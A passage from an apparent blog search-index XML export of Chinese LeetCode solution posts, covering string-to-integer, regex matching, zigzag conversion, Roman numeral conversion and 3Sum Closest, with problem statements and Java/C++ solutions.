class="line"></span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span></span><br><span class="line">						|| (res == Integer.MAX_VALUE / <span class="number">10</span> &amp;&amp; (c - <span class="string">'0'</span>) &gt; Integer.MAX_VALUE % <span class="number">10</span>)) &#123;</span><br><span class="line">					<span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span></span><br><span class="line">						|| (res == Integer.MIN_VALUE / <span class="number">10</span> &amp;&amp; (c - <span class="string">'0'</span>) &gt; -(Integer.MIN_VALUE % <span class="number">10</span>))) &#123;</span><br><span class="line">					<span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				res = res * <span class="number">10</span> + (c - <span class="string">'0'</span>) * sign;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>10. 正则表达式匹配</title>
    <url>/2018/09/10/LeetCode/leetcode-000010-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>s</code> 和一个字符规律 <code>p</code>，请你来实现一个支持 <code>&#39;.&#39;</code> 和 <code>&#39;*&#39;</code> 的正则表达式匹配。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;.&#39; 匹配任意单个字符</span><br><span class="line">&#39;*&#39; 匹配零个或多个前面的那一个元素</span><br></pre></td></tr></table></figure>

<p>所谓匹配，是要涵盖 <strong>整个</strong> 字符串 <code>s</code>的，而不是部分字符串。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><ul>
<li><code>s</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母。</li>
<li><code>p</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母，以及字符 <code>.</code> 和 <code>*</code>。</li>
</ul>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s &#x3D; &quot;aa&quot;</span><br><span class="line">p &#x3D; &quot;a&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = <span class="string">"aa"</span></span><br><span class="line">p = <span class="string">"a*"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br><span class="line">解释: 因为 <span class="string">'*'</span> 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 <span class="string">'a'</span>。因此，字符串 <span class="string">"aa"</span> 可被视为 <span class="string">'a'</span> 重复了一次。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s &#x3D; &quot;ab&quot;</span><br><span class="line">p &#x3D; &quot;.*&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释: &quot;.*&quot; 表示可匹配零个或多个（&#39;*&#39;）任意字符（&#39;.&#39;）。</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s = <span class="string">"aab"</span></span><br><span class="line">p = <span class="string">"c*a*b"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br><span class="line">解释: 因为 <span class="string">'*'</span> 表示零个或多个，这里 <span class="string">'c'</span> 为 <span class="number">0</span> 个, <span class="string">'a'</span> 被重复一次。因此可以匹配字符串 <span class="string">"aab"</span>。</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">s &#x3D; &quot;mississippi&quot;</span><br><span class="line">p &#x3D; &quot;mis*is*p*.&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">char</span> *p)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>( <span class="number">0</span> == *p) &#123;</span><br><span class="line">		    <span class="keyword">return</span> <span class="number">0</span> == *s;	</span><br><span class="line">	    &#125; </span><br><span class="line">	    <span class="keyword">if</span>(*(p+<span class="number">1</span>) != <span class="string">'*'</span>) &#123;</span><br><span class="line">		    <span class="keyword">if</span>(*p == *s || (*p) == <span class="string">'.'</span> &amp;&amp; (*s) != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> isMatch(s+<span class="number">1</span>, p+<span class="number">1</span>);</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		    <span class="keyword">while</span>(*p == *s || ((*p) == <span class="string">'.'</span> &amp;&amp; (*s) != <span class="number">0</span>)) &#123;</span><br><span class="line">			    <span class="keyword">if</span>(isMatch(s, p + <span class="number">2</span>)) &#123;</span><br><span class="line">			    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			    &#125;</span><br><span class="line">			    s++;</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="keyword">return</span> isMatch(s, p + <span class="number">2</span>);</span><br><span class="line">	    &#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>6. Z字形变换</title>
    <url>/2018/09/10/LeetCode/leetcode-000006-Z%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。</p>
<p>比如输入字符串为 “LEETCODEISHIRING” 行数为 3 时，排列如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L   C   I   R</span><br><span class="line">E T O E S I I G</span><br><span class="line">E   D   H   N</span><br></pre></td></tr></table></figure>

<p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;LCIRETOESIIGEDHN&quot;</code>。</p>
<p>请你实现这个将字符串进行指定行数变换的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string convert(string s, int numRows);</span><br></pre></td></tr></table></figure>

<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;LEETCODEISHIRING&quot;, numRows &#x3D; 3</span><br><span class="line">输出: &quot;LCIRETOESIIGEDHN&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"LEETCODEISHIRING"</span>, numRows = <span class="number">4</span></span><br><span class="line">输出: <span class="string">"LDREOEIIECIHNTSG"</span></span><br><span class="line">解释:</span><br><span class="line"></span><br><span class="line">L     D     R</span><br><span class="line">E   O E   I I</span><br><span class="line">E C   I H   N</span><br><span class="line">T     S     G</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">convert</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> nRows)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result;</span><br><span class="line">        <span class="keyword">if</span> (nRows &lt; <span class="number">2</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nRows;++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i;j &lt; s.length();j += <span class="number">2</span> * (nRows - <span class="number">1</span>)) &#123;</span><br><span class="line">                result.push_back(s[j]);</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; i &lt; nRows - <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j + <span class="number">2</span> * (nRows - i - <span class="number">1</span>) &lt; s.length())</span><br><span class="line">                        result.push_back(s[j + <span class="number">2</span> * (nRows - i - <span class="number">1</span>)]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>12. 整数转罗马数字</title>
    <url>/2018/09/10/LeetCode/leetcode-000012.%20%E6%95%B4%E6%95%B0%E8%BD%AC%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>罗马数字包含以下七种字符： <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             <span class="number">1</span></span><br><span class="line">V             <span class="number">5</span></span><br><span class="line">X             <span class="number">10</span></span><br><span class="line">L             <span class="number">50</span></span><br><span class="line">C             <span class="number">100</span></span><br><span class="line">D             <span class="number">500</span></span><br><span class="line">M             <span class="number">1000</span></span><br></pre></td></tr></table></figure>

<p>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p>
<pre><code>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。
X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 
C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</code></pre><p>给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">3</span></span><br><span class="line">输出: <span class="string">"III"</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">4</span></span><br><span class="line">输出: <span class="string">"IV"</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">4</span></span><br><span class="line">输出: <span class="string">"IV"</span></span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">58</span></span><br><span class="line">输出: <span class="string">"LVIII"</span></span><br><span class="line">解释: L = <span class="number">50</span>, V = <span class="number">5</span>, III = <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">1994</span></span><br><span class="line">输出: <span class="string">"MCMXCIV"</span></span><br><span class="line">解释: M = <span class="number">1000</span>, CM = <span class="number">900</span>, XC = <span class="number">90</span>, IV = <span class="number">4</span>.</span><br></pre></td></tr></table></figure>



<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>从最大的罗马数字开始判断，当前数比它大，减去该罗马数字。结果加上该数字的符号。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">intToRoman</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">""</span>;    </span><br><span class="line">        String[] symbol = &#123;<span class="string">"M"</span>,<span class="string">"CM"</span>,<span class="string">"D"</span>,<span class="string">"CD"</span>,<span class="string">"C"</span>,<span class="string">"XC"</span>,<span class="string">"L"</span>,<span class="string">"XL"</span>,<span class="string">"X"</span>,<span class="string">"IX"</span>,<span class="string">"V"</span>,<span class="string">"IV"</span>,<span class="string">"I"</span>&#125;;    </span><br><span class="line">        <span class="keyword">int</span>[] value = &#123;<span class="number">1000</span>,<span class="number">900</span>,<span class="number">500</span>,<span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>,  <span class="number">50</span>, <span class="number">40</span>,  <span class="number">10</span>, <span class="number">9</span>,   <span class="number">5</span>,  <span class="number">4</span>,   <span class="number">1</span>&#125;;   </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;num != <span class="number">0</span>;++i)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">while</span>(num &gt;= value[i]) &#123;  </span><br><span class="line">                num -= value[i];  </span><br><span class="line">                str += symbol[i];  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> str;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>13. 罗马数字转整数</title>
    <url>/2018/09/10/LeetCode/leetcode-000013.%20%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p>
<p>字符          数值<br>I             1<br>V             5<br>X             10<br>L             50<br>C             100<br>D             500<br>M             1000</p>
<p>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p>
<pre><code>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。
X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 
C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</code></pre><p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"III"</span></span><br><span class="line">输出: <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"IV"</span></span><br><span class="line">输出: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="示例-3："><a href="#示例-3：" class="headerlink" title="示例 3："></a>示例 3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"IX"</span></span><br><span class="line">输出: <span class="number">9</span></span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"LVIII"</span></span><br><span class="line">输出: <span class="number">58</span></span><br><span class="line">解释: L = <span class="number">50</span>, V= <span class="number">5</span>, III = <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"MCMXCIV"</span></span><br><span class="line">输出: <span class="number">1994</span></span><br><span class="line">解释: M = <span class="number">1000</span>, CM = <span class="number">900</span>, XC = <span class="number">90</span>, IV = <span class="number">4</span>.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">c2n</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'V'</span>: <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'X'</span>: <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>: <span class="keyword">return</span> <span class="number">50</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>: <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>: <span class="keyword">return</span> <span class="number">500</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>: <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Start typing your C/C++ solution below</span></span><br><span class="line">        <span class="comment">// DO NOT write int main() function</span></span><br><span class="line">        <span class="keyword">if</span>(s.size() &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> sb[<span class="number">9</span>] = &#123; <span class="string">'I'</span>,<span class="string">'V'</span>,<span class="string">'X'</span>, <span class="string">'L'</span>,<span class="string">'C'</span>, <span class="string">'D'</span>,<span class="string">'M'</span>, <span class="string">'v'</span>, <span class="string">'x'</span> &#125;;<span class="comment">//v和x应该是大写的上面有一横</span></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sub = c2n(s[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> lastv = sub;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">char</span> curc = s[i];</span><br><span class="line">            <span class="keyword">int</span> curv = c2n(curc);</span><br><span class="line">            <span class="keyword">if</span>(curv == lastv) </span><br><span class="line">                sub += curv;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>( curv &lt; lastv) &#123;</span><br><span class="line">                result += sub;</span><br><span class="line">                sub = curv;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sub = curv - sub;</span><br><span class="line">            &#125;</span><br><span class="line">            lastv = curv;</span><br><span class="line">        &#125;</span><br><span class="line">        result += sub;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>算出罗马数字的所有可能，然后按照先匹配两个，再匹配一个区计算</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String,Integer&gt; map ;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        initializeMap() ;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span> , n = s.length() ;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n - <span class="number">1</span>)&#123;</span><br><span class="line">            String temp = s.substring(i,i+<span class="number">2</span>) ;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                res += map.get(temp) ;</span><br><span class="line">                i += <span class="number">2</span> ;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                temp = temp.substring(<span class="number">0</span>,<span class="number">1</span>) ;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                    res += map.get(temp) ;</span><br><span class="line">                &#125;</span><br><span class="line">                i += <span class="number">1</span> ;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == n-<span class="number">1</span>)&#123;</span><br><span class="line">            res += map.get(s.substring(n-<span class="number">1</span>,n)) ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        map.put(<span class="string">"M"</span>,<span class="number">1000</span>) ;</span><br><span class="line">        map.put(<span class="string">"CM"</span>,<span class="number">900</span>) ;</span><br><span class="line">        map.put(<span class="string">"D"</span>,<span class="number">500</span>) ;</span><br><span class="line">        map.put(<span class="string">"CD"</span>,<span class="number">400</span>) ;</span><br><span class="line">        map.put(<span class="string">"C"</span>,<span class="number">100</span>) ;</span><br><span class="line">        map.put(<span class="string">"XC"</span>,<span class="number">90</span>) ;</span><br><span class="line">        map.put(<span class="string">"L"</span>,<span class="number">50</span>) ;     </span><br><span class="line">        map.put(<span class="string">"XL"</span>,<span class="number">40</span>) ;</span><br><span class="line">        map.put(<span class="string">"X"</span>,<span class="number">10</span>) ;</span><br><span class="line">        map.put(<span class="string">"IX"</span>,<span class="number">9</span>) ;</span><br><span class="line">        map.put(<span class="string">"V"</span>,<span class="number">5</span>) ;</span><br><span class="line">        map.put(<span class="string">"IV"</span>,<span class="number">4</span>) ;</span><br><span class="line">        map.put(<span class="string">"I"</span>,<span class="number">1</span>) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>16. 最接近的三数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000016.%20%E6%9C%80%E6%8E%A5%E8%BF%91%E7%9A%84%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p>
<p>例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.</p>
<p>与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2).</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">twoSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> start, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        <span class="keyword">int</span> head = start;</span><br><span class="line">        <span class="keyword">int</span> end = num.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> dis = INT_MAX;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(head &lt; end) &#123;</span><br><span class="line">            <span class="keyword">int</span> tem = num[head] + num[end];</span><br><span class="line">            <span class="keyword">if</span>(tem &lt; target) &#123;</span><br><span class="line">                <span class="keyword">if</span>(target - tem &lt; dis) &#123;</span><br><span class="line">                    dis = target - tem;</span><br><span class="line">                    result = tem;</span><br><span class="line">                &#125;</span><br><span class="line">                head ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(tem &gt; target) &#123;</span><br><span class="line">                <span class="keyword">if</span>(tem - target &lt; dis) &#123;</span><br><span class="line">                    dis = tem - target;</span><br><span class="line">                    result = tem;</span><br><span class="line">                &#125;</span><br><span class="line">                end --;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> target;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        <span class="keyword">int</span> dis = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> size = num.size() - <span class="number">2</span>;</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; size;i ++) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = target - num[i];</span><br><span class="line">            <span class="keyword">int</span> temDis;</span><br><span class="line">            <span class="keyword">int</span> temResult = twoSumClosest(num, i + <span class="number">1</span>, temp);</span><br><span class="line">            temDis = <span class="built_in">abs</span>(temResult - temp);</span><br><span class="line">            <span class="keyword">if</span>(temDis &lt; dis) &#123;</span><br><span class="line">                result = temResult + num[i];</span><br><span class="line">                dis = temDis;</span><br><span class="line">                <span class="keyword">if</span>(result == target) &#123;</span><br><span class="line">                    <span class="keyword">return</span> target;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
